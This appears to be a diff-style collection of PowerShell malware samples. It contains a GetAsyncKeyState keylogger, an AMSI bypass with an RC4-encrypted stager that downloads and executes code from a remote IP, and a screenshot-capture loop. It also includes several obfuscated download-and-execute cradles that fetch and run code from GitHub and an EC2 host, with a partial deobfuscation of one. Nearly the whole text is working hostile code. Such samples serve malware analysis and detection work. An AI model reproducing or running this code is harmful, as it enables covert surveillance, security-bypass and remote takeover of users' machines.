+$RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
+$LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
+$RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
+$TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
+$SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
+$DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
+$EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
+$BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
+$LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
+$RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
+$UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
+$DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
+$LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
+$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
+ 
+if ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}
+if ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}
+if ($LeftAlt   -or $RightAlt)   {$LogOutput += '[Alt]'}
+if ($TabKey)       {$LogOutput += '[Tab]'}
+if ($SpaceBar)     {$LogOutput += '[SpaceBar]'}
+if ($DeleteKey)    {$LogOutput += '[Delete]'}
+if ($EnterKey)     {$LogOutput += '[Enter]'}
+if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
+if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
+if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
+if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
+if ($DownArrow)    {$LogOutput += '[Down Arrow]'}
+if ($LeftMouse)    {$LogOutput += '[Left Mouse]'}
+if ($RightMouse)   {$LogOutput += '[Right Mouse]'}
+
+
+
+
+
+
+
+
+
+
+
+$LeftShift = $ImportDll::GetAsyncKeyState(160)
+$RightShift = $ImportDll::GetAsyncKeyState(161)
+$LeftCtrl = $ImportDll::GetAsyncKeyState(162)
+$RightCtrl = $ImportDll::GetAsyncKeyState(163)
+$LeftAlt = $ImportDll::GetAsyncKeyState(164)
+$RightAlt = $ImportDll::GetAsyncKeyState(165)
+$TabKey = $ImportDll::GetAsyncKeyState(9)
+$SpaceBar = $ImportDll::GetAsyncKeyState(32)
+$DeleteKey = $ImportDll::GetAsyncKeyState(127)
+$EnterKey = $ImportDll::GetAsyncKeyState(13)
+$BackSpaceKey = $ImportDll::GetAsyncKeyState(8)
+$LeftArrow = $ImportDll::GetAsyncKeyState(37)
+$RightArrow = $ImportDll::GetAsyncKeyState(39)
+$UpArrow = $ImportDll::GetAsyncKeyState(38)
+$DownArrow = $ImportDll::GetAsyncKeyState(34)
+$LeftMouse = $ImportDll::GetAsyncKeyState(1)
+$RightMouse = $ImportDll::GetAsyncKeyState(2)
+
+if ((($LeftShift -eq -32767) -or ($RightShift -eq -32767)) -or (($LeftShift -eq -32768) -or ($RightShfit -eq -32768))) {$LogOutput += '[Shift] '}
+if ((($LeftCtrl -eq -32767) -or ($LeftCtrl -eq -32767)) -or (($RightCtrl -eq -32768) -or ($RightCtrl -eq -32768))) {$LogOutput += '[Ctrl] '}
+if ((($LeftAlt -eq -32767) -or ($LeftAlt -eq -32767)) -or (($RightAlt -eq -32767) -or ($RightAlt -eq -32767))) {$LogOutput += '[Alt] '}
+if (($TabKey -eq -32767) -or ($TabKey -eq -32768)) {$LogOutput += '[Tab] '}
+if (($SpaceBar -eq -32767) -or ($SpaceBar -eq -32768)) {$LogOutput += '[SpaceBar] '}
+if (($DeleteKey -eq -32767) -or ($DeleteKey -eq -32768)) {$LogOutput += '[Delete] '}
+if (($EnterKey -eq -32767) -or ($EnterKey -eq -32768)) {$LogOutput += '[Enter] '}
+if (($BackSpaceKey -eq -32767) -or ($BackSpaceKey -eq -32768)) {$LogOutput += '[Backspace] '}
+if (($LeftArrow -eq -32767) -or ($LeftArrow -eq -32768)) {$LogOutput += '[Left Arrow] '}
+if (($RightArrow -eq -32767) -or ($RightArrow -eq -32768)) {$LogOutput += '[Right Arrow] '}
+if (($UpArrow -eq -32767) -or ($UpArrow -eq -32768)) {$LogOutput += '[Up Arrow] '}
+if (($DownArrow -eq -32767) -or ($DownArrow -eq -32768)) {$LogOutput += '[Down Arrow] '}
+if (($LeftMouse -eq -32767) -or ($LeftMouse -eq -32768)) {$LogOutput += '[Left Mouse] '}
+if (($RightMouse -eq -32767) -or ($RightMouse -eq -32768)) {$LogOutput += '[Right Mouse] '}
+
+
+
+
+
+
+
+
+
+
+[ReF].ASSEmbly.GetTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIElD('amsiInitFailed','NonPublic,Static').SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT System.NET.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERs.ADD('User-Agent',$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs = [SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS('Dv,inKZ&lt;@{3mjG4&amp;1k:Vcl7o)EY*J?6x');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD("Cookie","session=Pu8sEnIpxIwINbUOVsxlL66DoHA=");$ser='http://35.165.38[.]15:80';$t='/login/process.php';$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](&amp; $R $data ($IV+$K))|IEX
+
+
+
+
+function Get-TimedScreenshot
+{
+    [CmdletBinding()] Param(
+        [Parameter(Mandatory=$True)]
+        [ValidateScript({Test-Path -Path $_ })]
+        [String] $Path,
+
+        [Parameter(Mandatory=$True)]
+        [Int32] $Interval,
+
+        [Parameter(Mandatory=$True)]
+        [String] $EndTime
+    )
+
+    Function Get-Screenshot {
+       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
+       $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
+       $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
+       $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
+       $DrawingGraphics.Dispose()
+       $ScreenshotObject.Save($FilePath)
+       $ScreenshotObject.Dispose()
+    }
+
+    Try {
+
+        #load required assembly
+        Add-Type -Assembly System.Windows.Forms
+
+        Do {
+            #get the current time and build the filename from it
+            $Time = (Get-Date)
+
+            [String] $FileName = "$($Time.Month)"
+            $FileName += '-'
+            $FileName += "$($Time.Day)"
+            $FileName += '-'
+            $FileName += "$($Time.Year)"
+            $FileName += '-'
+            $FileName += "$($Time.Hour)"
+            $FileName += '-'
+            $FileName += "$($Time.Minute)"
+            $FileName += '-'
+            $FileName += "$($Time.Second)"
+            $FileName += '.png'
+
+            [String] $FilePath = (Join-Path $Path $FileName)
+            Get-Screenshot
+
+            Start-Sleep -Seconds $Interval
+        }
+
+        While ((Get-Date -Format HH:mm) -lt $EndTime)
+    }
+
+    Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
+}
+
+Get-TimedScreenshot -Path "$env:userprofile\Desktop" -Interval 2 -EndTime 24:00
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+while($true){Start-Sleep -s 120; $m=New-Object System.Net.WebClient;$pr = [System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;$m.Headers.Add('user-agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)'); iex(($m.downloadstring('https://raw.githubusercontent.com/rollzedice/js/master/drupal.js')));}
+
+
+
+
+-JOIn (( 32 ,32 , 36 ,86 ,115 , 110 , 50,108 , 54, 32 ,61 , 32,32 , 91,116,121,112,101, 93 ,40 ,34,123 ,51 , 125 , 123, 48 ,125, 123, 49, 125, ,53, 45 ,49, 54,55 , 45,39, 44 ,39 ,101 , 46 , 97, 109, 97 , 122 ,111,110 ,97, 39, 44, 39 ,53,39, 44,39, 119 , 115, 46, 99 , 111 , 109 ,58, 56 , 48 , 39 ,44 ,39,45 , 119, 101 ,115 , 39,41, 41 , 59)|%{([inT]$_-AS [chAr]) } ) | iex
+
+
+
+$Vsn2l6 =  [type]("{3}{0}{1}{2}" -F\'UE\',\'S\',\'t\',\'Net.webreq\') ;  $h69Q4  =[TYPe]("{1}{2}{3}{4}{0}"-F \'he\',\'nEt.C\',\'REDeNtialC\',\'a\',\'c\') ;  ${J}=&amp;("{0}{1}{2}"-f \'new-obj\',\'ec\',\'t\') ("{2}{1}{0}{3}" -f \'eb\',\'.w\',\'net\',\'client\');${j}."PRo`XY"=  ( VaRIablE  vsn2L6 ).VaLuE::("{0}{3}{2}{4}{1}"-f\'GetS\',\'Proxy\',\'em\',\'yst\',\'Web\').Invoke();${j}."pr`OXY"."C`RE`De`NTiALs"= (  GeT-VariaBle  H69Q4).VaLUe::"DE`Faultcred`en`TI`ALS";.("{0}{1}"-f \'I\',\'EX\') ${J}.("{1}{3}{2}{0}" -f \'string\',\'do\',\'load\',\'wn\').Invoke(("{3}{1}{9}{11}{8}{13}{0}{4}{15}{5}{10}{2}{12}{14}{7}{6}" -f\'5\',\'tp://\',\'mput\',\'ht\',\'.us\',\'t\',\'0/anSfrf\',\'8\',\'185-\',\'e\',\'-2.co\',\'c2-35-167-\',\'e.amazona\',\'5\',\'ws[.]com:80\',\'-wes\'));
+
+
+
+$Vsn2l6 = [type]Net.webreqUESt;
+$h69Q4 = [TYPe]nEt.CREDeNtialCache;
+&amp;new-object net.webclient;
+PRoXY	= $Vsn2l6.VaLuE::GetSystemWebProxy.Invoke();
+prOXY.CREDeNTiALs = ( GeT-VariaBle $h69Q4 ).VaLUe::DEFaultcredenTIALS;
+.IEX downloadstring.Invoke(http://ec2-35-167-185-55.us-west-2.compute.amazonaws[.]com:8080/anSfrf);
+
+
+
+
+
